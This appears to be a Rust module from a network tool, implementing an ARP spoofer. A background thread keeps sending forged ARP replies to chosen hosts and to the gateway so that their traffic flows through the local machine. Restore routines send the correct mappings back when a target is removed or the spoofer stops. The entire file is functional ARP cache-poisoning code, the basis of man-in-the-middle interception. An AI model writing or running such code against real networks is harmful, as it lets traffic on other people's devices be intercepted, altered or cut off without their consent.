use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use parking_lot::RwLock;

use crate::spoofer::raw_l2::{craft_arp_reply, RawL2Sender};
use crate::types::{Host, MacAddress};

pub struct ArpSpoofer {
    sender: Arc<RwLock<Option<RawL2Sender>>>,
    local_mac: MacAddress,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddress,
    targets: Arc<RwLock<HashMap<Ipv4Addr, Host>>>,
    running: Arc<AtomicBool>,
}

impl ArpSpoofer {
    pub fn new(
        iface_name: &str,
        local_mac: MacAddress,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddress,
    ) -> Self {
        let sender = match RawL2Sender::open(iface_name) {
            Ok(s) => Some(s),
            Err(e) => {
                eprintln!("[WARN] L2 raw injection initialization: {}", e);
                None
            }
        };

        Self {
            sender: Arc::new(RwLock::new(sender)),
            local_mac,
            gateway_ip,
            gateway_mac,
            targets: Arc::new(RwLock::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn add(&self, host: Host) {
        self.targets.write().insert(host.ip, host);
        self.start_worker();
    }

    pub fn remove(&self, ip: &Ipv4Addr) {
        if let Some(host) = self.targets.write().remove(ip) {
            self.restore(&host);
        }
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
        let targets = self.targets.write().drain().map(|(_, h)| h).collect::<Vec<_>>();
        for host in targets {
            self.restore(&host);
        }
    }

    fn restore(&self, host: &Host) {
        if let Some(ref sender) = *self.sender.read() {
            for _ in 0..3 {
                // Restore host: tell host that gateway is at gateway_mac
                let pkt_host = craft_arp_reply(
                    host.mac,
                    self.gateway_mac,
                    self.gateway_ip,
                    self.gateway_mac,
                    host.ip,
                    host.mac,
                );
                let _ = sender.send_frame(&pkt_host);

                // Restore gateway: tell gateway that host is at host.mac
                let pkt_gw = craft_arp_reply(
                    self.gateway_mac,
                    host.mac,
                    host.ip,
                    host.mac,
                    self.gateway_ip,
                    self.gateway_mac,
                );
                let _ = sender.send_frame(&pkt_gw);
                thread::sleep(Duration::from_millis(50));
            }
        }
    }

    fn start_worker(&self) {
        if self.running.swap(true, Ordering::SeqCst) {
            return;
        }

        let targets = Arc::clone(&self.targets);
        let sender = Arc::clone(&self.sender);
        let running = Arc::clone(&self.running);
        let local_mac = self.local_mac;
        let gateway_ip = self.gateway_ip;
        let gateway_mac = self.gateway_mac;

        thread::spawn(move || {
            while running.load(Ordering::Relaxed) {
                let hosts: Vec<Host> = targets.read().values().cloned().collect();
                if let Some(ref s) = *sender.read() {
                    for host in hosts {
                        // Poison target host: Gateway IP is at Local MAC
                        let pkt_host = craft_arp_reply(
                            host.mac,
                            local_mac,
                            gateway_ip,
                            local_mac,
                            host.ip,
                            host.mac,
                        );
                        let _ = s.send_frame(&pkt_host);

                        // Poison gateway: Host IP is at Local MAC
                        let pkt_gw = craft_arp_reply(
                            gateway_mac,
                            local_mac,
                            host.ip,
                            local_mac,
                            gateway_ip,
                            gateway_mac,
                        );
                        let _ = s.send_frame(&pkt_gw);
                    }
                }
                thread::sleep(Duration::from_secs(2));
            }
        });
    }
}
